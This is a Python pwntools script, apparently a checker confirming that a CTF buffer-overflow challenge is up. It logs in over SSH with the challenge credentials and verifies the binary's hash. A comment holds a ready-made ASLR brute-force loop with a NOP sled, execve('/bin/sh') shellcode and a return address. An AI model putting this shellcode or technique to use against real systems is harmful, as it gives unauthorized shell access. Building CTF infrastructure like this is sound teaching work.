#!/usr/bin/python3
from pwn import *
import os, hashlib
import random, string

host = "pwn2.ctf.insecurity-insa.fr"

def random_str():
    return ''.join([random.choice(string.ascii_letters + string.digits) for _ in range(20)])

def alive():
    s = ssh(host=host, user="user4000", password="123", level="error")
    elf = '/tmp/' + random_str()
    s.download_file('/challenge/level1/vuln', local=elf)
    sh = s.run('./vuln aaa')
    ret = sh.recvline(timeout=1)
    assert(ret == b'Hello aaa !\n')
    with open(elf, 'rb') as f:
        content = f.read()
    sha256_returned = hashlib.sha256(content).hexdigest()
    if sha256_returned != "3cb2fe870bd277112b9f9b7f5b5f763aabf7ae19f8156ffb9931e865ee54da64":
        return False
    os.system("rm " + elf)
    return True


def exploitable():
    # please see writeup for complete exploitation
    # we won't automate the exploitation as it requires
    # an ASLR bruteforce
    # for i in {1..50000}; do echo Essai:$i && \
    #     ./vuln `python -c "print '\x90'*1987 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' + '\x10\xd7\xba\xbf'"` \
    #     ;clear;done;
    return True


if __name__ == "__main__":
    print(alive() and exploitable())

